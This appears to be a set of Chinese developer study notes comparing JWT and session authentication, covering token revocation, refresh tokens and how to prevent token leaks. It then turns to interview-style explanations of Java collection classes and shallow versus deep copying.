<p>❗问题：如果服务端是集群部署（多个服务器），你要<strong>让所有服务节点都能查这个 session</strong>，所以要引入共享存储（如 Redis）。这增加了系统复杂性。</p>
</blockquote>
<h4 id="✅-使用-JWT-认证：">✅ 使用 JWT 认证：</h4>
<ol>
<li>用户登录成功后，服务端生成一个 JWT，<strong>把用户信息编码在 Token 内部</strong>（比如用户名、userId、权限等级等），再用私钥签名。</li>
<li>客户端每次请求都带上这个 Token（放在 Header 里）。</li>
<li>服务端收到请求后，只需要：
<ol>
<li>解码这个 Token，</li>
<li>验签是否被篡改，</li>
<li>然后直接拿里面的用户信息处理请求，<strong>无需查询数据库或 Redis。</strong></li>
</ol>
</li>
</ol>
<blockquote>
<p>✅ 优点：服务端不需要存储、同步任何登录状态数据，只要能解码和验签，就能完成认证。</p>
</blockquote>
<p>不过，也正是由于 JWT 的无状态，也导致了它最大的缺点：不可控！</p>
<p>就比如说，我们想要在 JWT 有效期内废弃一个 JWT 或者更改它的权限的话，并不会立即生效，通常需要等到有效期过后才可以。再比如说，当用户 Logout 的话，JWT 也还有效。除非，我们在后端增加额外的处理逻辑比如将失效的 JWT 存储起来，后端先验证 JWT 是否有效再进行处理。</p>
<h3 id="🔒-2-如何解决？有哪些方案？">🔒 2. 如何解决？有哪些方案？</h3>
<h4 id="✅-方案一：设置短有效期-刷新机制">✅ 方案一：<strong>设置短有效期 + 刷新机制</strong></h4>
<ul>
<li>把 JWT 设置成 5~10 分钟过期；</li>
<li>搭配一个 <strong>Refresh Token</strong>（长期有效，用于续签 Access Token）；</li>
<li>优点：短期内有问题不会持续太久；</li>
<li>缺点：需要额外维护 Refresh Token，并设计自动续签机制。</li>
</ul>
<h4 id="✅-方案二：服务端维护黑名单（Token-Blocklist）">✅ 方案二：<strong>服务端维护黑名单（Token Blocklist）</strong></h4>
<ul>
<li>用户 Logout 或 Token 被废弃时，记录该 JWT（或其唯一标识 jti）到黑名单；</li>
<li>每次请求时先检查 JWT 是否在黑名单；</li>
<li>优点：支持强制登出、权限变更立刻生效；</li>
<li>缺点：牺牲了「无状态」，服务端要存储数据。</li>
</ul>
<h4 id="✅-方案三：记录-JWT-的版本号（例如-tokenVersion-）">✅ 方案三：<strong>记录 JWT 的版本号（例如</strong> <strong><code>tokenVersion</code>****）</strong></h4>
<ul>
<li>JWT 中包含 <code>tokenVersion</code>；</li>
<li>每次用户权限变更或登出，服务端就更新该用户的 <code>tokenVersion</code>；</li>
<li>请求时，服务端查库校验用户当前的 <code>tokenVersion</code> 是否和 Token 中一致；</li>
<li>不一致说明 Token 已废弃；</li>
<li>优点：节省存储，不用黑名单；</li>
<li>缺点：要查数据库，增加了一点状态和查询成本。</li>
</ul>
<h3 id="✅-总结一句话：-3">✅ 总结一句话：</h3>
<blockquote>
<p>JWT 虽然带来了无状态、易于扩展的好处，但<strong>它的“自包含”也意味着难以主动失效</strong>，所以实际生产中通常会：</p>
<ul>
<li>设置较短的过期时间；</li>
<li>搭配刷新机制；</li>
<li>配合服务端校验或黑名单机制解决登出、权限变更的问题。</li>
</ul>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NGFkMTVkMmY4NGE4YjYzMmMxZDAyNzMyYWM2MDkzNTlfV2hSaVJ3NWY3R1NOVW5uSzZCNGxOZEk3MGhGc2dzSDBfVG9rZW46TGtENmJrWjlYb2x2M0R4UEtCV2N6aDBVbktlXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=M2M2OTFlNDA3MWRiOWI5YTgxNWFkNzE2ZDM1ZmVlNjZfams1VUZOQUZNS0l2cjlDdDY1VXBrVmVvaTRPZTViYWZfVG9rZW46SlF1amJnekRNb3hYQXp4bU1sdWN2MWNtblBoXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTY5ZjMxYjEwZWY4MDZhMTA4YTZiMDQ3NTAxOTI1MTJfQmlZTU9Mc0pxWEJmM2U1amI1UFIySkREVUNPMERiVk5fVG9rZW46TU9NTmJIWTUyb1pLNnN4VkFHUGM4S1ZhbnFlXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="为什么移动端更适合使用-JWT-而不是-Session">为什么移动端更适合使用 JWT 而不是 Session</h3>
<h3 id="一、状态管理差异">一、状态管理差异</h3>
<h4 id="Session（有状态）：">Session（有状态）：</h4>
<ul>
<li>服务器需要为每个客户端维护会话数据（如用户名、登录状态、权限等）。</li>
<li>移动设备网络经常变化（Wi-Fi ↔ 数据网络、断线重连），每次连接重建都需要保持原会话，依赖 Cookie 中的 Session ID。</li>
<li>如果 Session 失效，用户需要重新登录，影响用户体验。</li>
</ul>
<h4 id="JWT（无状态）：">JWT（无状态）：</h4>
<ul>
<li>服务端不需要存储用户状态，所有信息都编码在 JWT 中（包括用户身份、权限、过期时间等）。</li>
<li>客户端只需在请求时附带 JWT（放在 <code>Authorization</code> 头部或其他地方），即可完成身份校验。</li>
<li>更适合网络不稳定、重连频繁的移动场景。</li>
</ul>
<h3 id="二、跨平台兼容性">二、跨平台兼容性</h3>
<h4 id="Session-的局限性：">Session 的局限性：</h4>
<ul>
<li>移动端原生应用（如 iOS/Android）不天然支持 Web 的 Cookie 机制。</li>
<li>Web 浏览器中可以自动附带 Cookie，但移动端需要自己实现 Cookie 解析和 Session ID 管理，麻烦且容易出错。</li>
</ul>
<h4 id="JWT-的优势：">JWT 的优势：</h4>
<ul>
<li>本质是字符串，客户端用什么语言都能处理（iOS Swift、Android Kotlin、Flutter、React Native）。</li>
<li>存储灵活（如 <code>localStorage</code>、<code>Keychain</code>、<code>SharedPreferences</code>），无需依赖浏览器环境。</li>
<li>适配各种客户端平台更方便，前后端分离更彻底。</li>
</ul>
<h3 id="三、安全性角度">三、安全性角度</h3>
<h4 id="Session-的问题：">Session 的问题：</h4>
<ul>
<li>Cookie 容易被劫持（如 XSS 窃取），如果没有加上 <code>HttpOnly</code> 和 <code>Secure</code> 标志，会被脚本访问。</li>
<li>一旦 Session ID 泄露，攻击者即可伪装用户发起请求。</li>
</ul>
<h4 id="JWT-的优势：-2">JWT 的优势：</h4>
<ul>
<li>一般不通过 Cookie 存储，而是手动放入请求头中，避免被浏览器自动发送。</li>
<li>配合 HTTPS 加密传输、签名机制（如 HMAC-SHA256）和过期机制，安全性更强。</li>
<li>不容易受到 CSRF 攻击，因为恶意站点无法伪造 Authorization 请求头（而浏览器自动带上的 Cookie 更容易被利用）。</li>
</ul>
<h2 id="✅-一、为什么它们容易泄露">✅ 一、为什么它们容易泄露</h2>
<h3 id="🔓-1-Session-ID-泄露的常见原因">🔓 1. Session ID 泄露的常见原因</h3>
<p>Session ID 通常通过 <strong>浏览器 Cookie</strong> 存储并自动发送，泄露途径包括：</p>
<ul>
<li><strong>XSS（跨站脚本攻击）</strong>：攻击者通过注入恶意脚本，读取用户的 Cookie，包括 <code>Session ID</code>。</li>
<li><strong>Cookie 未设置 HttpOnly</strong>：这样脚本可以访问到 Cookie。</li>
<li><strong>未使用 HTTPS 传输</strong>：Session ID 可能在传输过程中被中间人监听（MITM 攻击）。</li>
<li><strong>浏览器插件</strong>：恶意插件可能访问本地 Cookie。</li>
</ul>
<h3 id="🔓-2-JWT-泄露的常见原因">🔓 2. JWT 泄露的常见原因</h3>
<p>JWT 通常存储在：</p>
<ul>
<li><code>localStorage</code>、<code>sessionStorage</code>（浏览器环境）</li>
<li>移动端的本地数据库或存储</li>
</ul>
<p>泄露方式包括：</p>
<ul>
<li><strong>XSS 攻击读取 localStorage</strong>：localStorage 没有类似 Cookie 的 <code>HttpOnly</code> 防护。</li>
<li><strong>在 URL 中传递 JWT</strong>：会被浏览器缓存或日志记录。</li>
<li><strong>前端代码泄露</strong>：在调试、日志、错误提示中不小心打印了 token。</li>
<li><strong>未加密传输</strong>：和 Session 一样，HTTP 下也可能被监听。</li>
</ul>
<h2 id="🛡-三、如何防止泄露">🛡 三、如何防止泄露</h2>
<h3 id="✅-对于-Session-ID：">✅ 对于 Session ID：</h3>
<ul>
<li><strong>设置 Cookie 的 HttpOnly、Secure、SameSite 属性</strong>：
<ul>
<li><code>HttpOnly</code>：防止 JS 访问。</li>
<li><code>Secure</code>：强制 HTTPS。</li>
<li><code>SameSite=Strict/Lax</code>：防止 CSRF。</li>
</ul>
</li>
<li><strong>使用 HTTPS 加密传输</strong>。</li>
<li><strong>服务端设置过期时间和登出机制</strong>。</li>
<li><strong>限制 Session 绑定设备信息/IP 变化自动失效</strong>。</li>
</ul>
<h3 id="✅-对于-JWT：">✅ 对于 JWT：</h3>
<ul>
<li><strong>绝对不要把 JWT 放在 URL 中传递</strong>。</li>
<li><strong>尽量不要用 localStorage，而用 Cookie + HttpOnly + SameSite</strong>。</li>
<li><strong>限制 token 生命周期（短时效），结合 Refresh Token 机制</strong>。</li>
<li><strong>开启 HTTPS，防止被中间人监听</strong>。</li>
<li><strong>设置 Token 黑名单机制（如登出后标记失效）</strong>。</li>
<li><strong>前端避免将 Token 打印到控制台或报错中</strong>。</li>
</ul>
<h3 id="JWT-的续签问题">JWT 的续签问题</h3>
<p>JWT 有效期一般都建议设置的不太长，那么 JWT 过期后如何认证，如何实现动态刷新 JWT，避免用户经常需要重新登录？</p>
<p>我们先来看看在 Session 认证中一般的做法：<strong>假如 Session 的有效期 30 分钟，如果 30 分钟内用户有访问，就把 Session 有效期延长 30 分钟。</strong></p>
<p>JWT 认证的话，我们应该如何解决续签问题呢？查阅了很多资料，我简单总结了下面 4 种方案：</p>
<h4 id="1、类似于-Session-认证中的做法（不推荐）"><strong>1、类似于 Session 认证中的做法（不推荐）</strong></h4>
<p><strong>1、类似于 Session 认证中的做法（不推荐）</strong></p>
<p>这种方案满足于大部分场景。假设服务端给的 JWT 有效期设置为 30 分钟，服务端每次进行校验时，如果发现 JWT 的有效期马上快过期了，服务端就重新生成 JWT 给客户端。客户端每次请求都检查新旧 JWT，如果不一致，则更新本地的 JWT。这种做法的问题是仅仅在快过期的时候请求才会更新 JWT ，对客户端不是很友好。</p>
<h2 id="✅-一、这种方案的基本流程">✅ 一、这种方案的基本流程</h2>
<ol>
<li><strong>用户登录</strong>后，服务器签发一个 JWT（例如有效期 30 分钟），返回给客户端。</li>
<li><strong>客户端将 JWT 保存</strong>到 <code>localStorage</code>（或 Cookie）中。</li>
<li><strong>每次客户端发请求</strong>时，都会带上这个 JWT（通常放在请求头里）。</li>
<li><strong>服务端验证 JWT</strong> 是否有效：
<ol>
<li>✅ 有效就继续处理业务。</li>
<li>🕒 如果发现<strong>token 马上就要过期了（比如 5 分钟内）</strong>：
<ul>
<li>重新签发一个新 JWT（比如再给 30 分钟）</li>
<li>将新 JWT 放在响应中（例如响应头 <code>Authorization: Bearer 新Token</code>）</li>
</ul>
</li>
</ol>
</li>
<li><strong>客户端收到响应后</strong>，检查新旧 token：
<ol>
<li>如果发现有新 JWT，则替换本地旧的 JWT。</li>
</ol>
</li>
</ol>
<h2 id="✅-二、举个实际例子">✅ 二、举个实际例子</h2>
<p>假设小明使用一个手机 App 登录后台系统。</p>
<h3 id="登录后：">登录后：</h3>
<ul>
<li>服务端生成：</li>
<li><code>&#123; ``  &quot;userId&quot;: 123, ``  &quot;exp&quot;: 1716441000   // 当前时间+30分钟 ``&#125;</code></li>
<li>返回给小明客户端的 JWT 是：<code>eyJhbGci...</code></li>
</ul>
<h3 id="小明操作过程：">小明操作过程：</h3>
<ol>
<li>10 分钟后，请求商品列表：
<ol>
<li>JWT 还剩 20 分钟，服务端继续处理，不续期。</li>
</ol>
</li>
<li>25 分钟后，请求订单信息：
<ol>
<li>只剩 5 分钟，服务端检测到接近过期，于是返回一个新 JWT：
<ul>
<li>客户端替换旧 JWT。</li>
</ul>
</li>
</ol>
</li>
<li>用户下次请求再带新 JWT，循环进行。</li>
</ol>
<h2 id="⚠️-三、这种方式的问题点">⚠️ 三、这种方式的问题点</h2>
<h3 id="❌-问题一：被动续期，不及时">❌ 问题一：<strong>被动续期，不及时</strong></h3>
<ul>
<li>必须在“快过期”前客户端主动发请求，才能拿到新 JWT。</li>
<li>如果用户很久没操作，突然一操作，JWT 可能已经过期了。</li>
</ul>
<p>📌 举例：</p>
<blockquote>
<p>小明中午 12:00 登录，12:25 发了请求，拿到新 JWT，有效期到 12:55。 结果他到 13:00 才再次使用，此时 JWT 已过期，需重新登录或刷新。</p>
</blockquote>
<h3 id="❌-问题二：客户端逻辑复杂">❌ 问题二：<strong>客户端逻辑复杂</strong></h3>
<ul>
<li>客户端每次都要检查响应头是否有新 token，如果有还得更新存储。</li>
<li>如果客户端漏了这一步，就仍然在用旧 token，导致过期。</li>
</ul>
<h3 id="❌-问题三：会话控制弱">❌ 问题三：<strong>会话控制弱</strong></h3>
<ul>
<li>服务端无法即时废弃某个 JWT（如用户登出或封禁），除非做黑名单校验。</li>
</ul>
<h2 id="✅-四、常见的优化方式">✅ 四、常见的优化方式</h2>
<p>为了解决这些问题，可以考虑：</p>
<h3 id="✅-方案一：引入-Refresh-Token">✅ 方案一：引入 Refresh Token</h3>
<ul>
<li>登录后服务端发两个 token：
<ul>
<li><strong>Access Token</strong>（JWT，有效期短，比如 15 分钟）</li>
<li><strong>Refresh Token</strong>（有效期长，比如 7 天）</li>
</ul>
</li>
</ul>
<h4 id="使用方式：">使用方式：</h4>
<ul>
<li>Access Token 过期后，客户端用 Refresh Token 去请求一个新的 Access Token。</li>
<li>Refresh Token 可以存数据库并可随时作废，便于登出、封禁控制。</li>
</ul>
<h3 id="✅-方案二：Sliding-Session（滑动会话）">✅ 方案二：Sliding Session（滑动会话）</h3>
<ul>
<li>每次请求时都“刷新”有效期（如每次发请求都更新为当前时间+30分钟）。</li>
<li>缺点是攻击者拿到 JWT 后可以一直续期。</li>
<li>所以要结合：
<ul>
<li>IP、设备指纹校验</li>
<li>限制 refresh 频率</li>
<li>黑名单机制防滥用</li>
</ul>
</li>
</ul>
<h2 id="✅-Refresh-Token-是怎么解决这些问题的？">✅ Refresh Token 是怎么解决这些问题的？</h2>
<p>因为我们会<strong>把 Refresh Token 存在服务端的数据库或 Redis 里</strong>，而且它是“有状态的”。这就带来了三个能力：</p>
<h3 id="🔐-1-用户登出时删除-Refresh-Token">🔐 1. <strong>用户登出时删除 Refresh Token</strong></h3>
<ul>
<li>当用户点击「退出登录」时，客户端调用登出接口：
<ul>
<li>服务端就把这个用户的 Refresh Token 从数据库里删掉。</li>
</ul>
</li>
<li>之后即使用户携带旧的 Refresh Token 来换新 Access Token，服务端会发现它 <strong>查不到</strong>，于是拒绝请求。</li>
</ul>
<p>✅ 实现了「登出即失效」的控制能力。</p>
<h3 id="🚫-2-封禁账号时使-Refresh-Token-失效">🚫 2. <strong>封禁账号时使 Refresh Token 失效</strong></h3>
<ul>
<li>管理员封禁用户后，只要把该用户的所有 Refresh Token 从数据库里清除或标记为“失效”，就能做到：
<ul>
<li><strong>之后任何请求，即使 token 没过期，也无法继续访问。</strong></li>
</ul>
</li>
</ul>
<p>✅ 实现了「权限变更即时生效」的能力。</p>
<h3 id="🔄-3-刷新机制通过-Refresh-Token-控制-Access-Token-生命周期">🔄 3. <strong>刷新机制通过 Refresh Token 控制 Access Token 生命周期</strong></h3>
<ul>
<li>Access Token 是临时凭证，如果被盗了，最多 15 分钟失效；</li>
<li>但刷新新的 Access Token 时，必须提供合法有效的 Refresh Token，<strong>它在服务端受控</strong>。</li>
</ul>
<p>这就相当于你给了客户端一个「暂时有效的通行证」，而刷新它的「签发权」仍掌握在你手上。</p>
<h2 id="✅-举个完整例子更清晰">✅ 举个完整例子更清晰</h2>
<ol>
<li>小明登录后，服务器发两个 token：
<ol>
<li>Access Token（JWT，有效期 15 分钟）</li>
<li>Refresh Token（UUID，有效期 7 天，保存到 Redis：<code>refresh_token:user123 -&gt; 有效</code>）</li>
</ol>
</li>
<li>小明用了 13 分钟后，Access Token 快过期，用 Refresh Token 换新：
<ol>
<li>服务端检查 Redis，发现合法，就签新 token。</li>
</ol>
</li>
<li>小明点击「退出登录」：
<ol>
<li>服务端删掉 Redis 里的 Refresh Token。</li>
</ol>
</li>
<li>这时小明再请求换 token：
<ol>
<li>服务端查不到 Refresh Token，返回 401 Unauthorized。</li>
</ol>
</li>
<li>管理员封禁小明：
<ol>
<li>清除所有该用户的 Refresh Token 或标记为失效；</li>
<li>小明即使手上有 Access Token，最多还能用几分钟就失效；</li>
<li>想刷新 Access Token？服务端已经不再信任他的 Refresh Token。</li>
</ol>
</li>
</ol>
<blockquote>
<p>那直接将jwt存入redis中，登出的时候直接删掉它不就好了？干嘛多搞Refresh Token、Access Token？</p>
</blockquote>
<h2 id="✅-你说的方案：JWT-存入-Redis，然后登出时删掉">✅ 你说的方案：<strong>JWT 存入 Redis，然后登出时删掉</strong></h2>
<h3 id="流程如下：">流程如下：</h3>
<ol>
<li>用户登录时，服务端生成 JWT，并存入 Redis，例如： <code>jwt:eyJ.... = userInfo（或true）</code>，设置 30 分钟过期。</li>
<li>客户端拿到 JWT，每次请求都带着；</li>
<li>服务端验证 JWT：
<ol>
<li>校验签名；</li>
<li>检查 Redis 里有没有这个 token；</li>
</ol>
</li>
<li>登出时，把 Redis 中的 JWT 删掉。</li>
</ol>
<h3 id="🔍-这种方案本质上做到了「可控的-JWT」，也能立即登出、禁用-token。">🔍 这种方案本质上做到了「可控的 JWT」，也能立即登出、禁用 token。</h3>
<h2 id="❌-但问题也来了：你用-JWT，却牺牲了-JWT-的最大优势——无状态">❌ 但问题也来了：<strong>你用 JWT，却牺牲了 JWT 的最大优势——无状态</strong></h2>
<p>JWT 的设计初衷：</p>
<blockquote>
<p>自包含、自验证，服务端无需存储，只靠 token 本身即可校验身份。</p>
</blockquote>
<p>而你这个方案里，必须在 Redis 查一次，才能判断 token 是否有效，这就跟「传统 session」本质上没太大差别了。</p>
<p>你用了个 JWT 的壳子，但还是状态化的，和 Session 没本质区别，反而复杂了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YTUzMzBiMDZhMWM5N2RjMmJmN2QwN2I4MzFhMWM1ZTFfckZlc296c0l2UFVNcUlQTU9jMWhTYWNvRFNoVXp0QklfVG9rZW46WktLSmJLak9ob0RuM254NEx4OGNUZFpWbmljXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h4 id="2、每次请求都返回新-JWT（不推荐）">2、每次请求都返回新 JWT（不推荐）</h4>
<p>这种方案的的思路很简单，但是，开销会比较大，尤其是在服务端要存储维护 JWT 的情况下。</p>
<h4 id="3、JWT-有效期设置到半夜（不推荐）">3、JWT 有效期设置到半夜（不推荐）</h4>
<p>这种方案是一种折中的方案，保证了大部分用户白天可以正常登录，适用于对安全性要求不高的系统。</p>
<h4 id="4、用户登录返回两个-JWT（推荐）（在方案一中有涉及到相关知识点）">4、用户登录返回两个 JWT（推荐）（在方案一中有涉及到相关知识点）</h4>
<p>第一个是 accessJWT ，它的过期时间 JWT 本身的过期时间比如半个小时，另外一个是 refreshJWT 它的过期时间更长一点比如为 1 天。refreshJWT 只用来获取 accessJWT，不容易被泄露。</p>
<p>客户端登录后，将 accessJWT 和 refreshJWT 保存在本地，每次访问将 accessJWT 传给服务端。服务端校验 accessJWT 的有效性，如果过期的话，就将 refreshJWT 传给服务端。如果有效，服务端就生成新的 accessJWT 给客户端。否则，客户端就重新登录即可。</p>
<p>这种方案的不足是：</p>
<ul>
<li>需要客户端来配合；</li>
<li>用户注销的时候需要同时保证两个 JWT 都无效；</li>
<li>重新请求获取 JWT 的过程中会有短暂 JWT 不可用的情况（可以通过在客户端设置定时器，当 accessJWT 快过期的时候，提前去通过 refreshJWT 获取新的 accessJWT）;</li>
<li>存在安全问题，只要拿到了未过期的 refreshJWT 就一直可以获取到 accessJWT。不过，由于 refreshJWT 只用来获取 accessJWT，不容易被泄露。</li>
</ul>
<h1>小林-spring</h1>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=M2RlZDczY2EzY2MyMDdmY2Q3MzdkY2E3ODExMTk1OWFfTTJ0Rk1PUU9KMlFUcHFSQTFjMk5DWmI5RU5oZG9mZzBfVG9rZW46SWZwTGJJZkZ2b3BBR294YnlRRmNxcHJmblZjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h1>javaguide-java篇</h1>
<h2 id="java-util、java-util-concurrent包的集合类和接口">java.util、java.util.concurrent包的集合类和接口</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NzQ0NDU3ZWFjOTAzNzYyNDQzNzY0YmE0NTRhYWI5ODdfaEpUNDVvZG9POWlvVHVmNVZCcFdoWENmejRsOVBPRUlfVG9rZW46S1d4emIzOTYwb204VXB4b3U4TmNkdjd3bnVoXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>上面这张类图是 Java“集合框架（Collection Framework）”的经典层级图，展示的是 <strong><code>java.util</code></strong> <strong>包下的集合类和接口的继承体系</strong>，但它 <strong>不包含并发集合类（如</strong> <strong><code>ConcurrentHashMap</code><strong><strong>、</strong></strong><code>CopyOnWriteArrayList</code>****）的内容</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MmI4YmZlNDFmZmNjMjk5Mzg0NjllNjVmM2Q2MjNmOWJfYTQxc2FjRGJhTTdaTGI0Unh4cFZXSWNXNk5JcHpkZ1NfVG9rZW46UDlwVWIxb25Gbzh1eE14NmZIbGNGakVEbmx2XzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="1-ConcurrentHashMap-K-V">1. <code>ConcurrentHashMap&lt;K,V&gt;</code></h2>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="symbol">ConcurrentHashMap</span>&lt;<span class="symbol">K,<span class="symbol">V</span></span>&gt;<span class="symbol">extends</span> <span class="symbol">AbstractMap</span>&lt;<span class="symbol">K,<span class="symbol">V</span></span>&gt;<span class="symbol">implements</span> <span class="symbol">ConcurrentMap</span>&lt;<span class="symbol">K,<span class="symbol">V</span></span>&gt;, <span class="symbol">Serializable</span> &#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>直接父类</strong>：<code>java.util.AbstractMap&lt;K,V&gt;</code></li>
<li><strong>实现接口</strong>：<code>ConcurrentMap&lt;K,V&gt;</code>（并发专用的 Map 接口） 以及 <code>Serializable</code></li>
</ul>
<p><strong>面试话术示例</strong>：</p>
<blockquote>
<p>“<code>ConcurrentHashMap</code> 是基于分段锁/节点自旋优化的并发哈希表，它在类层次上继承自 <code>AbstractMap</code> （因此复用了 Map 的大部分模板方法），并实现了 <code>ConcurrentMap</code> 接口以暴露并发安全的 <code>putIfAbsent</code>、<code>remove(key, val)</code> 等原子操作。”</p>
</blockquote>
<h2 id="2-CopyOnWriteArrayList-E">2. <code>CopyOnWriteArrayList&lt;E&gt;</code></h2>
<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CopyOnWriteArrayList</span>&lt;<span class="type">E</span>&gt;<span class="title">implements</span> <span class="title">List</span>&lt;<span class="type">E</span>&gt;, <span class="type">RandomAccess</span>, <span class="type">Cloneable</span>, <span class="type">java.io.Serializable</span> &#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>直接父类</strong>：<code>java.lang.Object</code></li>
<li><strong>实现接口</strong>：
<ul>
<li><code>List&lt;E&gt;</code>（最基本的 List 接口）</li>
<li><code>RandomAccess</code>（标记支持快速随机访问）</li>
<li><code>Cloneable</code></li>
<li><code>Serializable</code></li>
</ul>
</li>
</ul>
<p>它<strong>并不</strong>继承自 <code>AbstractList</code> 或其他 Collection 抽象类，而是自己完全重写了 <code>add</code>/<code>get</code>/<code>iterator</code> 等方法，内部维护一个 <code>volatile Object[] array</code> 并在每次写操作时<strong>拷贝</strong>整个数组以实现读写分离。</p>
<p><strong>面试话术示例</strong>：</p>
<blockquote>
<p>“<code>CopyOnWriteArrayList</code> 为写时复制的 List，实现了 <code>List</code> 接口但并不继承 <code>AbstractList</code>，它把所有写操作（<code>add</code>、<code>remove</code>）都做成先复制底层数组再修改，从而保证读操作无需锁，读性能极高，适合读多写少的场景。”</p>
</blockquote>
<h2 id="✅-1-ArrayList-的默认容量阈值">✅ 1. <strong>ArrayList 的默认容量阈值</strong></h2>
<ul>
<li><code>ArrayList</code> 的底层是一个 <strong>动态数组</strong>，并不是链表。</li>
<li><strong>默认初始容量（threshold）是：10</strong></li>
<li>当添加第11个元素时，才触发 <strong>扩容</strong>：
<ul>
<li>扩容策略是：<code>newCapacity = oldCapacity + (oldCapacity &gt;&gt; 1)</code>，即 <strong>1.5 倍扩容</strong>。</li>
</ul>
</li>
</ul>
<p>📌 示例代码：</p>
<figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">List&lt;<span class="built_in">String</span>&gt; list = new ArrayList&lt;&gt;();<span class="string">` `</span>// 添加元素超过<span class="number">10</span>个时触发扩容 <span class="string">``</span><span class="keyword">for</span> (int i = <span class="number">0</span>; i &lt; <span class="number">11</span>; i++) &#123; <span class="string">``</span>    list.add(<span class="string">&quot;item&quot;</span> + i); <span class="string">``</span>&#125;</span><br></pre></td></tr></table></figure>
<h2 id="✅-2-链表（LinkedList）无容量限制">✅ 2. <strong>链表（LinkedList）无容量限制</strong></h2>
<ul>
<li><code>LinkedList</code> 是基于双向链表实现的，没有“容量阈值”概念，因为它不是数组结构。</li>
<li>每新增一个节点，就创建一个新对象，链接到链表中。</li>
</ul>
<h2 id="✅-面试话术参考">✅ 面试话术参考</h2>
<blockquote>
<p>“ArrayList 是基于数组实现的，默认初始容量是 10。添加第 11 个元素时会触发扩容，采用 1.5 倍扩容策略。而 LinkedList 是基于双向链表实现的，不存在容量限制，每新增一个元素就动态分配节点。”</p>
</blockquote>
<h2 id="LinkedList-为什么不能实现-RandomAccess-接口？">LinkedList 为什么不能实现 RandomAccess 接口？</h2>
<p><code>RandomAccess</code> 是一个标记接口，用来表明实现该接口的类支持随机访问（即可以通过索引快速访问元素）。由于 <code>LinkedList</code> 底层数据结构是链表，内存地址不连续，只能通过指针来定位，不支持随机快速访问，所以不能实现 <code>RandomAccess</code> 接口</p>
<h2 id="深拷贝浅拷贝">深拷贝浅拷贝</h2>
<h3 id="✅-浅拷贝（Shallow-Copy）">✅ 浅拷贝（Shallow Copy）</h3>
<ul>
<li>复制对象时：
<ul>
<li><strong>基本类型值会被复制</strong></li>
<li><strong>引用类型不会复制引用的对象，只复制“引用地址”</strong></li>
</ul>
</li>
<li>两个对象的引用字段会 <strong>指向同一块内存地址</strong></li>
</ul>
<p>📌 例子（Java 中的 <code>clone()</code> 默认是浅拷贝）：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="title">implements</span> <span class="title">Cloneable</span> </span>&#123; <span class="string">``</span>    String name;</span><br><span class="line">    <span class="keyword">int</span> age; <span class="string">``</span>    Address address; <span class="string">``</span>    public Object clone() throws CloneNotSupportedException &#123;</span><br><span class="line">       <span class="keyword">return</span> super.clone();  <span class="regexp">//</span> 浅拷贝<span class="string">` `</span>    &#125; <span class="string">``</span>&#125;</span><br></pre></td></tr></table></figure>
<p>如果你修改 <code>address.city</code>，原对象和新对象都会变。</p>
<h3 id="✅-深拷贝（Deep-Copy）">✅ 深拷贝（Deep Copy）</h3>
<ul>
<li>复制对象时：
<ul>
<li>不仅复制基本类型字段</li>
<li>对于引用类型字段，也会 <strong>创建新的对象副本</strong></li>
</ul>
</li>
<li>原对象与新对象互不影响，完全独立</li>
</ul>
<p>📌 实现方式：</p>
<ul>
<li>手动实现 clone</li>
<li>使用序列化：ObjectOutputStream + ObjectInputStream</li>
<li>使用工具库如 Apache Commons Lang、Jackson 等</li>
</ul>
